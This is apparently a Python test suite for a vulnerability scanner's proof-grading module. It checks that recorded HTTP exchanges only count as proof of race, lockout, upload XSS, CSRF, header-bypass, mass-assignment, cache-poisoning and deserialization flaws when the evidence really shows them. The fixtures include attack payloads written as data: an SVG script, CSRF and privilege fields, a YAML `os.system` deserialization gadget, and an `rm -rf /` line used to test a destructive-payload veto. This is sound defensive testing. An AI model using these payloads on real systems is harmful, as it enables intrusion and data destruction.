    """`verify_concurrent_crossing` read ANY non-2xx after the burst as "the
    limit refused it". A 404 says the thing is missing, a 3xx says it moved,
    a 5xx says the server broke and a 429 says you were too fast - none of
    them says the action had a limit that was crossed."""
    def hit(rid, body="granted", status=200, ts=1000.0, ms=50.0):
        return {"id": rid, "ts": ts,
                "request": {"method": "GET", "url": "http://t.local/redeem",
                            "headers": {}, "body": None},
                "response": {"status": status, "headers": {}, "body": body,
                             "elapsed_ms": ms}}
    burst = [hit(f"b{i}", ts=1000.0 + i * 0.01) for i in range(3)]
    for status, body in ((404, "not found"), (302, ""), (500, "oops"),
                         (429, "too many requests")):
        after = hit("x", body=body, status=status, ts=1002.0, ms=10.0)
        verdict = proof.grade("race", "granted", burst + [after])
        assert verdict.grade != "proven", f"{status}: {verdict.explain()}"
        assert "a serial attempt afterwards was refused" in verdict.missing

    # a 409 whose body is the SAME as the burst's is not a refusal of anything
    same = hit("y", body="granted", status=409, ts=1002.0, ms=10.0)
    assert proof.grade("race", "granted", burst + [same]).grade != "proven"

    # the real thing: three wins, then the action reports itself spent
    spent = hit("z", body="already redeemed", status=409, ts=1002.0, ms=10.0)
    assert proof.grade("race", "granted",
                       burst + [spent]).grade == "proven"


def test_five_page_views_are_not_five_authentication_attempts():
    """`verify_no_throttle` counted any five requests to one endpoint, and
    never asked whether they carried a credential or whether they failed. So
    five views of `/about` graded `proven`, and so did five SUCCESSFUL
    logins - a lockout policy governs failures."""
    views = [ex(f"v{i}", "http://t.local/about", "welcome") for i in range(6)]
    verdict = proof.grade("lockout", "welcome", views)
    assert verdict.grade != "proven", verdict.explain()
    assert ("a counted series of failed authentication attempts is on record"
            in verdict.missing)

    good = [ex(f"g{i}", "http://t.local/login", '{"ok": true}', method="POST",
               req_body="username=admin&password=right") for i in range(6)]
    assert proof.grade("lockout", '{"ok": true}', good).grade != "proven"

    bad = [ex(f"b{i}", "http://t.local/login", '{"ok": false}', 401,
              method="POST", req_body=f"username=admin&password=guess{i}")
           for i in range(6)]
    assert proof.grade("lockout", '{"ok": false}', bad).grade == "proven"


def test_an_upload_fetched_from_another_host_is_not_this_targets_problem():
    """`verify_served_upload` accepted any cited exchange as the fetch: a
    different host, a page recorded before the upload, or a fetch following
    an upload the server REFUSED."""
    boundary = "----argusupl1"
    svg = ('<svg xmlns="http://www.w3.org/2000/svg">'
           "<script>/*argusupl1234*/alert(1)</script></svg>")
    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="file"; '
            f'filename="x.svg"\r\nContent-Type: image/svg+xml\r\n\r\n'
            f"{svg}\r\n--{boundary}--\r\n")

    def upload(rid, status=200):
        return {"id": rid,
                "request": {"method": "POST", "url": "http://t.local/upload",
                            "headers": {}, "body": body},
                "response": {"status": status, "headers": {},
                             "body": '{"url":"/files/x.svg"}'}}

    def fetch(rid, host="t.local"):
        return {"id": rid,
                "request": {"method": "GET",
                            "url": f"http://{host}/files/x.svg",
                            "headers": {}, "body": None},
                "response": {"status": 200,
                             "headers": {"content-type": "image/svg+xml"},
                             "body": svg}}

    assert proof.grade("upload", svg[:50],
                       [upload("u1"), fetch("u2")]).grade == "proven"
    # a copy served by somebody else
    assert proof.grade("upload", svg[:50],
                       [upload("u3"),
                        fetch("u4", host="cdn.other.example")]
                       ).grade != "proven"
    # an upload the server refused
    assert proof.grade("upload", svg[:50],
                       [upload("u5", 403), fetch("u6")]).grade != "proven"
    # a fetch recorded BEFORE the upload cannot be the stored file
    assert proof.grade("upload", svg[:50],
                       [fetch("u7"), upload("u8")]).grade != "proven"


def test_a_benign_body_naming_get_is_not_a_desync():
    """`BOGUS_METHOD_RE`'s `G[A-Z]{2,}` matched `GET` itself, so any response
    containing `"method": "GET"`, `(GET)` or `method GET not allowed`
    satisfied the desync check."""
    for text in ('{"method": "GET"}', "Allowed: (GET)",
                 "method GET not allowed", "Allow: GET, POST"):
        assert not proof.BOGUS_METHOD_RE.search(text), text
    for text in ("Unsupported method ('GGET')", "method GPOST", "501 GPUT"):
        assert proof.BOGUS_METHOD_RE.search(text), text


def test_no_verifier_raises_on_a_malformed_request_or_response():
    """`(entry.get("request") or {})` reads as a guard and is not one: a list
    is truthy, so `.get` on it raises. Twelve classes died that way, reported
    by `grade()` as "evidence is readable" failing - which hides whatever the
    real answer was. Found by an adversarial audit."""
    shapes = {
        "request is a list": {"request": ["GET", "http://t/"],
                              "response": {"status": 200, "headers": {},
                                           "body": "hello world here",
                                           "elapsed_ms": 5}},
        "request is a string": {"request": "GET /",
                                "response": {"status": 200, "headers": {},
                                             "body": "hello world here"}},
        "response is a list": {"request": {"method": "GET",
                                           "url": "http://t/",
                                           "headers": {}, "body": None},
                               "response": ["200", "ok"]},
        "headers are strings": {"request": {"method": "GET",
                                            "url": "http://t/",
                                            "headers": "a: b", "body": None},
                                "response": {"status": "x", "headers": "y",
                                             "body": "hello world here",
                                             "elapsed_ms": "z"}},
        "both are None": {"request": None, "response": None},
    }
    for name, shape in shapes.items():
        entries = [{"id": "r1", "ts": 1.0, **shape}]
        for klass in proof.classes():
            verdict = proof.grade(klass, "hello world here", entries)
            unreadable = [c for c in verdict.checks
                          if c["check"] == "evidence is readable"
                          and not c["ok"]]
            assert not unreadable, (
                f"{klass} raised on {name}: "
                f"{unreadable[0].get('detail')}")

    # and entries that are not dicts at all
    for klass in proof.classes():
        verdict = proof.grade(klass, "x", ["not an entry", 42, None])
        assert not [c for c in verdict.checks
                    if c["check"] == "evidence is readable" and not c["ok"]]


def _ex(eid, method, url, body, *, ts, headers=None, status=200):
    return {"id": eid, "ts": ts,
            "request": {"method": method, "url": url,
                        "headers": headers or {}},
            "response": {"status": status, "body": body}}


def test_csrf_refuses_the_pre_write_state_as_the_proof():
    """Quoting the state BEFORE the write is the reverse of the requirement.

    `verify_state_change` collected "reads carrying the excerpt" and "reads
    not carrying it" without comparing when either happened, so a claim
    could quote the pre-write body and cite a later read that no longer had
    it. Any site whose two reads differ - a timestamp, a counter, a rotating
    banner - satisfied "the state changed between two reads". Measured on
    the lab: a real cross-origin write to /api/config graded `proven` on the
    quote `{"theme": "dark", "lang": "en"}`, which is what the resource said
    before the write landed.
    """
    foreign = {"Origin": "https://evil.example"}
    exchanges = [
        _ex("r1", "GET", "http://lab/api/config", '{"theme": "dark"}', ts=1),
        _ex("r2", "POST", "http://lab/api/config", '{"merged": true}',
            ts=2, headers=foreign),
        _ex("r3", "GET", "http://lab/api/config",
            '{"theme": "dark", "mark": "landed"}', ts=3),
    ]
    # the honest claim: the quote is in the read AFTER the write only
    good = proof.grade("csrf", '"mark": "landed"', exchanges)
    assert good.grade == "proven", good.missing
    # the reversed claim: the quote is the pre-write body, which the later
    # read no longer carries
    bad = proof.grade("csrf", '{"theme": "dark"}', exchanges)
    assert bad.grade != "proven", [c for c in bad.checks if c.get("ok")]
    assert any("state changed between two reads" in str(c.get("check"))
               and not c.get("ok") for c in bad.checks)


def test_csrf_refuses_reads_that_both_precede_the_write():
    """Two reads before the write cannot show the write changed anything."""
    exchanges = [
        _ex("r1", "GET", "http://lab/x", "before", ts=1),
        _ex("r2", "GET", "http://lab/x", "nonce-abc123", ts=2),
        _ex("r3", "POST", "http://lab/x", "ok", ts=3,
            headers={"Origin": "https://evil.example"}),
    ]
    v = proof.grade("csrf", "nonce-abc123", exchanges)
    assert v.grade != "proven", v.checks


def test_xfh_proves_the_rewrite_variant_but_not_an_ignored_header():
    """X-Original-URL: the bypass path and the refused path cannot be equal.

    And the header has to have done something: a server that ignores it
    serves the same page either way, which must not prove the class.
    """
    # the header named /admin, /admin is refused, and the control on the
    # bypass path without the header answers differently
    real = [
        _ex("r1", "GET", "http://lab/reset", "reset form", ts=1),
        _ex("r2", "GET", "http://lab/admin", "Forbidden", ts=2, status=403),
        _ex("r3", "GET", "http://lab/reset", "admin panel: users=3",
            ts=3, headers={"X-Original-URL": "/admin"}),
    ]
    v = proof.grade("xfh", "admin panel: users=3", real)
    assert v.grade == "proven", v.missing

    # the same shape against a server that ignores the header: the bypass
    # response is byte-identical to the control, so nothing was bypassed
    ignored = [
        _ex("r1", "GET", "http://lab/hello", "hello page", ts=1),
        _ex("r2", "GET", "http://lab/nope", "not found", ts=2, status=404),
        _ex("r3", "GET", "http://lab/hello", "hello page", ts=3,
            headers={"X-Original-URL": "/nope"}),
    ]
    v = proof.grade("xfh", "hello page", ignored)
    assert v.grade != "proven", v.checks

    # and a refusal somewhere unrelated, with no rewrite header naming it,
    # is still not the control
    unrelated = [
        _ex("r1", "GET", "http://lab/hello", "hello page", ts=1),
        _ex("r2", "GET", "http://lab/admin", "Forbidden", ts=2, status=403),
        _ex("r3", "GET", "http://lab/hello", "hello page with extra",
            ts=3, headers={"X-Real-IP": "127.0.0.1"}),
    ]
    v = proof.grade("xfh", "hello page with extra", unrelated)
    assert v.grade != "proven", v.checks


def test_xfh_rewrite_control_must_be_the_same_request():
    """The attack my own first version of this check allowed.

    `by_rewrite` asked for a control on the same PATH whose body merely
    DIFFERED. On any site with a 404 page that is free: send
    `X-Original-URL: /nope` to `/search?q=a`, cite `/search?q=b` as the
    control - it differs because the queries do - and cite the 404 on
    `/nope` as the refusal. The header was ignored and nothing was
    bypassed. The control has to be the same request without the header,
    and it has to lack the quoted content.
    """
    exchanges = [
        _ex("r1", "GET", "http://lab/search?q=a", "results for a",
            ts=1, headers={"X-Original-URL": "/nope"}),
        _ex("r2", "GET", "http://lab/search?q=b", "results for b", ts=2),
        _ex("r3", "GET", "http://lab/nope", "not found", ts=3, status=404),
    ]
    v = proof.grade("xfh", "results for a", exchanges)
    assert v.grade != "proven", v.checks

    # the same shape with a real control - identical URL, no header, and the
    # restricted content absent from it - does prove
    honest = [
        _ex("r1", "GET", "http://lab/search?q=a", "admin panel: users=3",
            ts=1, headers={"X-Original-URL": "/nope"}),
        _ex("r2", "GET", "http://lab/search?q=a", "results for a", ts=2),
        _ex("r3", "GET", "http://lab/nope", "not found", ts=3, status=404),
    ]
    v = proof.grade("xfh", "admin panel: users=3", honest)
    assert v.grade == "proven", v.missing


def test_csrf_refuses_two_different_pages_as_the_change():
    """"State changed" means one resource's content changed.

    `before` and `after` were not required to be the same resource, so on
    any site: read /home, send the write, read /about, and quote text that
    /about has always carried. `verify_unkeyed_input` already required the
    same resource because a value "appearing elsewhere on the site is not a
    cache entry"; the same reasoning applies here and was missing.
    """
    foreign = {"Origin": "https://evil.example"}
    exchanges = [
        _ex("r1", "GET", "http://lab/home", "welcome home", ts=1),
        _ex("r2", "POST", "http://lab/comment", "ok", ts=2, headers=foreign),
        _ex("r3", "GET", "http://lab/about", "about-page-text", ts=3),
    ]
    v = proof.grade("csrf", "about-page-text", exchanges)
    assert v.grade != "proven", v.checks

    # the same resource before and after does prove
    same = [
        _ex("r1", "GET", "http://lab/profile", "email: old@x", ts=1),
        _ex("r2", "POST", "http://lab/profile", "ok", ts=2, headers=foreign),
        _ex("r3", "GET", "http://lab/profile", "email: evil@attacker", ts=3),
    ]
    v = proof.grade("csrf", "email: evil@attacker", same)
    assert v.grade == "proven", v.missing


def test_csrf_ordering_is_fail_closed_without_timestamps():
    """I asserted the opposite here, and the assertion was the defect.

    The first version of this ordered an exchange by its POSITION when the
    session carried no `ts`. But the cited list is built as
    `[entries.get(r) for r in evidence_ids]`, so its order is whatever the
    finding's author wrote - a claimant listing the ids in a chosen order
    would decide which read came "before" the write. An ordering a claimant
    controls is not an ordering.

    So it fails closed: no recorded time, no before/after, no proof.

    That part is unchanged. What DID change is the tied-timestamp case,
    which this test also used to refuse on the reasoning that "at the
    recorder's resolution they cannot be told apart". The reasoning was
    right and the premise was wrong: the clock's resolution is not the
    recorder's. `ts` is `round(time.time(), 3)` and `time.time()` on
    Windows has a granularity near 16ms, so events tens of milliseconds
    apart tie there - which graded a csrf the lab really has as
    `candidate` and failed two Windows CI jobs on two Python versions.

    Meanwhile the recorder knows the order exactly and always did: it
    assigns `r1`, `r2`, `r3` from a counter under its own lock, before any
    author sees them. That sequence is the tie-break now.

    The security property is what the last block asserts, because it is the
    one that could have been lost: a claimant controls which ids are cited
    and in what order, so the verdict must not move when the citation order
    does, and must follow the RECORDER's order even when the author's
    contradicts it.
    """
    foreign = {"Origin": "https://evil.example"}
    no_ts = [
        {"id": "r1", "request": {"method": "GET", "url": "http://lab/p",
                                 "headers": {}},
         "response": {"status": 200, "body": "email: old@x"}},
        {"id": "r2", "request": {"method": "POST", "url": "http://lab/p",
                                 "headers": foreign},
         "response": {"status": 200, "body": "ok"}},
        {"id": "r3", "request": {"method": "GET", "url": "http://lab/p",
                                 "headers": {}},
         "response": {"status": 200, "body": "email: evil@attacker"}},
    ]
    v = proof.grade("csrf", "email: evil@attacker", no_ts)
    assert v.grade != "proven", v.checks
    assert any("state changed between two reads" in str(c.get("check"))
               and not c.get("ok") for c in v.checks)

    # the same three with recorded time, in order, do prove
    stamped = [dict(e, ts=float(i + 1)) for i, e in enumerate(no_ts)]
    assert proof.grade("csrf", "email: evil@attacker",
                       stamped).grade == "proven"

    # one shared timestamp is still an order, because the recorder issued
    # r1/r2/r3 in that order and nothing an author does changes which
    # number each entry carries
    tied = [dict(e, ts=5.0) for e in no_ts]
    assert proof.grade("csrf", "email: evil@attacker",
                       tied).grade == "proven"

    # the property that matters: the citation order is the author's, so it
    # must not decide. Same three entries, cited backwards, same verdict.
    assert proof.grade("csrf", "email: evil@attacker",
                       list(reversed(tied))).grade == "proven"

    # and the recorder's order wins over the author's: relabel so the read
    # carrying the new value was recorded BEFORE the write, and the change
    # is no longer evidenced by it - whatever order it is cited in
    relabelled = [dict(tied[0], id="r9"),      # the pre-write read, late
                  dict(tied[1], id="r5"),      # the write
                  dict(tied[2], id="r1")]      # the post-write read, early
    for ordering in (relabelled, list(reversed(relabelled))):
        v2 = proof.grade("csrf", "email: evil@attacker", ordering)
        assert v2.grade != "proven", v2.checks
        assert any("state changed between two reads" in str(c.get("check"))
                   and not c.get("ok") for c in v2.checks), v2.checks

def test_every_gradeable_class_reaches_an_owasp_bucket():
    """`_CWE` is pinned to the matrix; the second hop was pinned to nothing.

    `test_every_class_maps_to_a_cwe` holds the first hop - every proof class
    has a CWE. Reports are summarised in a second taxonomy, and nothing held
    that one in either direction. It was already short: `_CWE` carried 29
    distinct CWEs and `_OWASP` had 27 keys, so a `ppoll` finding that graded
    PROVEN carried a CWE and then vanished from the OWASP summary the audit
    report is organised by - present in one taxonomy, absent from the other.

    So: every CWE reachable by a gradeable class has a bucket, or is named
    in `_OWASP_UNBUCKETED` with the reason it cannot be reached. `dos` is
    the only member, because it is refused by construction and no finding
    can ever carry its CWE anywhere.
    """
    from argus.session import _CWE, _OWASP, _OWASP_UNBUCKETED, _owasp_of

    for klass in proof.classes():
        cwe = _CWE.get(re.sub(r"[^a-z0-9]", "", klass.lower()), "")
        assert cwe, f"{klass} has no CWE - the first hop is broken"
        if cwe in _OWASP_UNBUCKETED:
            continue
        assert _owasp_of(cwe), (
            f"{klass} grades and carries {cwe}, which reaches no OWASP "
            "bucket - the finding would be summarised in one taxonomy and "
            "dropped from the other. Add the bucket, or name the CWE in "
            "_OWASP_UNBUCKETED with the reason it is unreachable.")

    # the exemptions must be real CWEs of real classes, or they cover
    # nothing and the gap reopens one level up
    assert set(_OWASP_UNBUCKETED) <= set(_CWE.values()), \
        sorted(set(_OWASP_UNBUCKETED) - set(_CWE.values()))
    assert not (set(_OWASP_UNBUCKETED) & set(_OWASP))
    for cwe, why in _OWASP_UNBUCKETED.items():
        assert len(why) > 40, f"{cwe} is exempt without a stated reason"

    # and the class that prompted it really does summarise now
    assert _owasp_of(_CWE["ppoll"]), "ppoll still reaches no bucket"


def test_lockout_reads_the_latency_the_throttle_lives_in():
    """A progressive delay is a throttle, and this check could not see one.

    `verify_no_throttle` decided "refused" from status 429 and a body regex
    only. `elapsed_ms` is recorded on every exchange and, until this, no
    verifier but `verify_concurrent_crossing` ever read it - so the
    commonest real defence, backing off a little more each time with no 429
    and no lockout wording, graded `lockout` PROVEN. Proven here means "this
    target has no lockout", so the gate was asserting the absence of a
    defence that was in the record it declined to read.

    The probe's half missed it for the reason this suite keeps recording:
    `probe_lockout` tests the same property with a DERIVED ratio,
    `last3_avg > first3_avg * 3 + 150`, which on this ramp computes
    550 > 750 and says no. Two quantities describe one property; the
    recorded one is the one that kept the signal.
    """
    def attempt(n, elapsed):
        return ex(f"r{n + 1}", "http://t/login",
                  "Invalid username or password", status=401, method="POST",
                  req_body=f"username=admin&password=guess{n}",
                  req_headers={"Content-Type":
                               "application/x-www-form-urlencoded"},
                  elapsed_ms=elapsed, ts=1000.0 + n)

    ramp = [attempt(n, 150.0 + 50 * n) for n in range(10)]
    v = proof.grade("lockout", "Invalid username or password", ramp)
    assert v.grade != "proven", v.checks
    refused = [c for c in v.checks
               if "none of them was refused" in str(c.get("check"))]
    assert refused and not refused[0]["ok"], v.checks
    assert "latency ramps" in refused[0]["detail"], refused[0]["detail"]

    # ...and a series that really is unthrottled must still prove, or the
    # class has just been made unprovable
    flat = [attempt(n, 150.0) for n in range(10)]
    assert proof.grade("lockout", "Invalid username or password",
                       flat).grade == "proven"


def test_race_refusal_needs_a_winner_to_differ_from():
    """`all()` over an empty sequence is True, and that was load-bearing.

    `_spent_refusal` ends with `all(body != resp_body(w) for w in won)`, so
    with no winner in the burst it returned True on the status allowlist
    alone - and the check whose whole stated job is "a different answer than
    the one the burst got" passed with nothing to differ from. Three
    overlapping 409s and a later 409 satisfied it.

    The grade stayed `unproven` because "more than one of them succeeded"
    fails independently, so this was a check reporting a pass on nothing
    rather than a false positive. It still mattered: it feeds
    `score = (len(burst) >= 2) + (len(won) >= 2) + bool(refused)`, where it
    hands an all-refused group a point it can win the group selection with,
    against a group that actually contains the race.
    """
    burst = [ex("r1", "http://t/redeem", '{"ok":false}', status=409,
                ts=1000.20, elapsed_ms=200.0),
             ex("r2", "http://t/redeem", '{"ok":false}', status=409,
                ts=1000.25, elapsed_ms=200.0)]
    after = ex("r3", "http://t/redeem", '{"ok":false}', status=409,
               ts=1001.0, elapsed_ms=100.0)
    v = proof.grade("race", '{"ok":false}', burst + [after])
    assert v.grade != "proven", v.checks
    refusal = [c for c in v.checks
               if "a serial attempt afterwards was refused" in str(c.get("check"))]
    assert refusal and not refusal[0]["ok"], v.checks


def test_massassign_refuses_a_read_recorded_before_the_write():
    """A false positive, found by an adversarial sweep and reproduced here.

    The check is named "a later read shows it set" and nothing established
    "later". `_pairs` yields both orderings of every cited pair and
    `_witness` keeps the best-scoring one, so a read recorded BEFORE the
    write satisfied it.

    What that accepts is the defence working. A legitimately-admin account
    read from GET /api/me, paired with a POST /api/register that sends
    `role=admin`, gets a 200 and silently DROPS the field - the exact case
    this verifier's docstring says was measured on `/api/order` - graded
    `massassign` proven.

    `verify_state_change` was fixed for this same shape, with a ten-line
    comment about quoting the pre-write state, and the fix never reached
    here. Two siblings, one of them corrected.
    """
    read = ex("r1", "http://t/api/me", '{"user":"bob","role":"admin"}',
              ts=1000.0)
    write = ex("r2", "http://t/api/register", '{"ok":true}', ts=1001.0,
               method="POST", req_body='{"user":"bob","role":"admin"}')
    v = proof.grade("massassign", '"role":"admin"', [write, read])
    assert v.grade != "proven", v.checks
    assert any("a later read shows it set" in str(c.get("check"))
               and not c.get("ok") for c in v.checks), v.checks

    # the same write with a read recorded AFTER it is the real finding
    later = ex("r3", "http://t/api/me", '{"user":"bob","role":"admin"}',
               ts=1002.0)
    assert proof.grade("massassign", '"role":"admin"',
                       [write, later]).grade == "proven"

    # and the citation order is the author's, so it must not decide
    assert proof.grade("massassign", '"role":"admin"',
                       [later, write]).grade == "proven"


def test_cache_refuses_a_victim_read_recorded_before_the_poisoning():
    """The same false positive in the other verifier that pairs exchanges.

    `verify_unkeyed_input` serves both `cache` and `ppoll`, and in each case
    it is the `floor` check. It required the value to be in the poisoner's
    request, in the victim's response, absent from the victim's request, and
    both on one endpoint shape - but never that the poisoning happened
    first. So any value already on the page before the probe ran satisfied
    "the value reached a requester that did not send it".
    """
    victim = ex("r1", "http://t/p?x=1", "hello evil.test bye", ts=1000.0)
    poisoner = ex("r2", "http://t/p?x=2", "ok", ts=1001.0,
                  req_headers={"X-Forwarded-Host": "evil.test"})
    for klass in ("cache", "ppoll"):
        v = proof.grade(klass, "evil.test", [poisoner, victim])
        assert v.grade != "proven", (klass, v.checks)
        assert any("reached a requester that did not send it"
                   in str(c.get("check")) and not c.get("ok")
                   for c in v.checks), (klass, v.checks)

    after = ex("r3", "http://t/p?x=1", "hello evil.test bye", ts=1002.0)
    assert proof.grade("cache", "evil.test",
                       [poisoner, after]).grade == "proven"
    # citation order is the author's
    assert proof.grade("cache", "evil.test",
                       [after, poisoner]).grade == "proven"


def test_massassign_refuses_a_read_that_does_not_carry_the_field():
    """"A later read shows it set" asked only that SOME bytes came back.

    The check required the excerpt to appear in a read and not in that
    read's request - which any ordinary response body satisfies. Paired with
    a write that merely MENTIONED a privileged field in its request and got
    a 200, that proved the class. Measured on the lab: `/api/order` drops
    every injected field and says so, and massassign graded `proven` on the
    quote `{"order": 1, "owner": "user-1", "total": 11}` - the endpoint's
    own ordinary answer.
    """
    sent = '{"order":1,"role":"admin","is_admin":true}'
    whitelisted = [
        _ex("r1", "POST", "http://lab/api/order",
            '{"order": 1, "owner": "user-1", "total": 11}', ts=1),
        _ex("r2", "GET", "http://lab/api/order/1",
            '{"order": 1, "owner": "user-1", "total": 11}', ts=2),
    ]
    whitelisted[0]["request"]["body"] = sent
    v = proof.grade("massassign", '{"order": 1, "owner": "user-1", '
                                  '"total": 11}', whitelisted)
    assert v.grade != "proven", v.checks
    assert any("later read shows it set" in str(c.get("check"))
               and not c.get("ok") for c in v.checks)

    # the honest claim: the read returns the field AND the value the write
    # sent, and the read's own request never carried them
    bound = [
        _ex("r1", "POST", "http://lab/api/register",
            '{"created": {"username": "x", "role": "admin", "id": 10}}',
            ts=1),
        _ex("r2", "GET", "http://lab/api/register/10",
            '{"username": "x", "role": "admin", "id": 10}', ts=2),
    ]
    bound[0]["request"]["body"] = '{"username":"x","role":"admin"}'
    v = proof.grade("massassign", '"role": "admin"', bound)
    assert v.grade == "proven", v.missing


def test_massassign_sees_a_form_body_whose_first_pair_is_privileged():
    """`req_text` joins the parts with spaces, so `role=admin&...` as the
    first pair in a form body is preceded by whitespace, not by `&`.

    The boundary was `[?&]`, so form-encoded APIs were unprovable for this
    class: the write's privileged field was never found at all.
    """
    bound = [
        _ex("r1", "POST", "http://lab/register", "created id=10", ts=1),
        _ex("r2", "GET", "http://lab/register/10",
            "username=x role=admin id=10", ts=2),
    ]
    bound[0]["request"]["body"] = "role=admin&username=x"
    v = proof.grade("massassign", "role=admin id=10", bound)
    assert v.grade == "proven", v.missing


def test_massassign_does_not_read_an_html_role_attribute_as_a_field():
    """The form branch reads the body, so markup posted as a body must not
    register - `role=` after whitespace is an ARIA attribute on any page,
    and widening the shared pattern to accept it re-opened a real bypass
    once. See test_the_aria_role_attribute_is_not_a_subject_field.
    """
    html = [
        _ex("r1", "POST", "http://lab/preview", "rendered", ts=1),
        _ex("r2", "GET", "http://lab/preview/1",
            '<li role=menuitem>home</li>', ts=2),
    ]
    html[0]["request"]["body"] = '<li role=menuitem>home</li>'
    v = proof.grade("massassign", "<li role=menuitem>home</li>", html)
    assert v.grade != "proven", v.checks


def _deser(req_body, resp_body, *, ctype="text/plain", status=200):
    return {"id": "r1", "ts": 1,
            "request": {"method": "POST", "url": "http://lab/import",
                        "headers": {"Content-Type": "application/json"},
                        "body": req_body},
            "response": {"status": status,
                         "headers": {"Content-Type": ctype},
                         "body": resp_body}}


def test_a_gadget_that_only_raises_a_parser_error_is_not_deserialize():
    """The lab's `/import`, written down as a measurement.

    `deserialize` is excluded from the live agreement table for a stated
    reason: `/import` accepts magic-bytes payloads and answers with
    `java.io.InvalidClassException: filter status - REJECTED`, never
    executing, so "identity output plus the probe nonce" is unobtainable
    against it. That exclusion was prose. The class already had both
    synthetic directions - see
    test_deserialize_declares_a_gadget_not_a_shell_separator - but not this
    shape: a deserialization *surface*, worth a candidate, which is not
    execution. Asserting it is what makes the stated exclusion a
    measurement.
    """
    v = proof.grade(
        "deserialize",
        "java.io.InvalidClassException: filter status - REJECTED",
        [_deser('{"data": "rO0ABXNyABFqYXZhLnV0aWwu"}',
                "java.io.InvalidClassException: filter status - REJECTED",
                status=500)])
    assert v.grade != "proven", v.checks
    missing = {c["check"] for c in v.checks if not c.get("ok")}
    assert "identity output returned by the target" in missing, v.checks
    assert "the probe nonce came back in the output" in missing, v.checks


def test_a_gadget_and_an_identity_line_without_the_nonce_is_not_deserialize():
    """Without the nonce the output is not tied to this probe.

    A target that happens to serve a page containing `uid=0(root)` would
    otherwise complete the proof for anyone who sent a gadget at it. The
    existing proving case carries a nonce, so nothing had asked what
    happens when it is absent.
    """
    gadget = '{"data": "!!python/object/apply:os.system [\\"id\\"]"}'
    v = proof.grade("deserialize", "uid=0(root) gid=0(root)",
                    [_deser(gadget, "uid=0(root) gid=0(root) groups=0(root)")])
    assert v.grade != "proven", v.checks
    assert any("nonce came back" in str(c.get("check"))
               and not c.get("ok") for c in v.checks)


def test_a_destructive_deserialize_payload_voids_the_evidence():
    """The veto applies here exactly as it does to rce.

    A gadget whose command is not a read makes the demonstration the
    damage, which this system refuses whatever it proves. The veto was
    asserted for rce and never for this class, which shares the verifier.
    """
    gadget = ('{"data": "!!python/object/apply:os.system '
              '[\\"rm -rf /; echo argusd3adb33f\\"]"}')
    out = "uid=0(root) gid=0(root)\nargusd3adb33f\n"
    v = proof.grade("deserialize", "uid=0(root) gid=0(root)",
                    [_deser(gadget, out)])
    assert v.grade != "proven", v.checks
    assert any("stayed benign" in str(c.get("check"))
               and not c.get("ok") for c in v.checks)
